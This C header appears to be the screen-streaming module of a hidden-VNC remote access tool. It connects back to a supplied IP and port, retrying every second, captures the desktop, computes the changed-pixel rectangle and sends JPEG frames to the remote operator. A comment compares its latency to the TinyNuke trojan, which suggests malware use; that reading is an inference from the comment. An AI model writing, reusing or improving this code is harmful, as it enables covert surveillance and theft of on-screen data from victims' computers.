#ifndef VNC_INCL
#define VNC_INCL
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "jpeg.h"
#include "socks.h"
static HDESK dsk;
static int sendframe = 0;
static int fullf = 0;
typedef struct network{
    char* ip;
    int port;
} NETWORK;
static void inputthd(){
    while(1){
        char* data = vnc_sock_recv();
        if(data==NULL) return;
        if(data[0]==0x67){
            //full frame send, do not use incremental
            fullf = 1;
        }
        sendframe = 1;
        free(data);
    }
}
void vncspawn(NETWORK* net){
    dsk = GetThreadDesktop(GetCurrentThreadId());
    
    while(vnc_sock_init(net->ip, net->port) == -1) Sleep(1000);
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)inputthd, NULL, 0, NULL);
    HWND hDesk = GetDesktopWindow();
    RECT rect;
    GetWindowRect(hDesk, &rect);
    HDC hdc = GetDC(NULL);
    unsigned char* pastbm = calloc(10000000, 1);
    unsigned char* bitmap;
    int scrw = GetSystemMetrics(SM_CXSCREEN);
	int scrh = GetSystemMetrics(SM_CYSCREEN);
    //main loop
    while(1){
        while(!sendframe) Sleep(100);
        sendframe=0;
        HDC memdc = CreateCompatibleDC(hdc);
        HBITMAP hbitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
        SelectObject(memdc, hbitmap);
        BitBlt(memdc, 0, 0, scrw, scrh, hdc, 0, 0, SRCCOPY);
        
        bitmap = calloc(10000000, 1);
        DWORD cb = GetBitmapBits(hbitmap, 10000000, bitmap);
        int bpb = cb/(rect.right*rect.bottom);
        int top = 0;
        int topset = 0;
        int left = rect.right;
        int bot = 0;
        int right = 0;
        //fullframe send
        if(fullf){
            memset(pastbm, 0, 10000000);
            fullf = 0;
        }
        //otherwise we draw out a rectangle which contains all the changed pixels. we only transmit that instead of fullframe(which tinynuke does), greatly decrease latency
        //esp powerful for decrease typing latency, which is the most annoying one to work with
        for(int i=0;i<cb;i+=bpb){
            if(memcmp(pastbm+i, bitmap+i, bpb)!=0){
                int y = i/(bpb*rect.right);
                if(!topset){
                    top = y;
                    topset = 1;
                }
                int x = (i/bpb)%rect.right;
                if(x<left) left = x;
                if(x>right) right = x;
                if(y>bot) bot = y;
            }
        }
        if(left==rect.right) left=0;
        bot++;
        right++;
        if(bot>rect.bottom) bot = rect.bottom;
        if(right>rect.right) right = rect.right;
        free(pastbm);
        //bitblt the changed rect
        HDC hNew = CreateCompatibleDC(hdc);
        HBITMAP hBmp = CreateCompatibleBitmap(hdc, right - left, bot - top); 
        SelectObject(hNew, hBmp);
        BitBlt(hNew, 0, 0, right - left, bot - top, memdc, left, top, SRCCOPY);
        DeleteObject(hbitmap);
        DeleteDC(memdc);
        pastbm = bitmap;
        int sz = 0;
        //convert to png
        char* jpg = bmptojpg(hBmp, &sz);
        DeleteObject(hBmp);
        DeleteDC(hNew);
        if(vnc_sock_send(jpg, sz, left, top)) break;
    }
    free(bitmap);
    free(net->ip);
    free(net);
}
#endif